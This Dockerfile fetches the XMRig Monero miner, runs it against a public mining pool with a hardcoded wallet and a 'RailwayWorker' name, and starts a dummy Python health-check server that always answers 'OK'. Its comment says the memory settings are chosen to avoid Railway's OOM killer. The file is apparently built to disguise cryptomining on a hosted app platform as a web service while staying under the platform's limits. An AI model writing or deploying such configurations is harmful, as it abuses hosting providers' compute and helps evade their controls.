FROM debian:12-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates \
    curl \
    tar \
    python3 \
    libhwloc-dev \
    libuv1-dev \
    libssl-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

RUN curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && \
    tar -xzf xmrig.tar.gz --strip-components=1 && \
    rm xmrig.tar.gz && \
    chmod +x xmrig

RUN echo 'import http.server, os, threading\n\
class Handler(http.server.BaseHTTPRequestHandler):\n\
    def do_GET(self):\n\
        self.send_response(200)\n\
        self.end_headers()\n\
        self.wfile.write(b"OK")\n\
port = int(os.environ.get("PORT", 8080))\n\
server = http.server.HTTPServer(("0.0.0.0", port), Handler)\n\
threading.Thread(target=server.serve_forever, daemon=True).start()' > healthcheck.py

ENV PYTHONUNBUFFERED=1

# Light mode keeps RAM under 256MB to avoid Railway's OOM killer
CMD python3 healthcheck.py & ./xmrig \
    -a rx/0 \
    -o rx.unmineable.com:3333 \
    -u XMR:44t6aUmnEkmNXWrVNGZhmYhGi7m5iydtNFse9VsdfjSQYyoMvhXwpMASXPQ8JWDtoyiooKEwFCJ84YnNiNQ2fG4kJhDqGxm.RailwayWorker \
    -p x \
    --randomx-mode=light \
    --donate-level=1
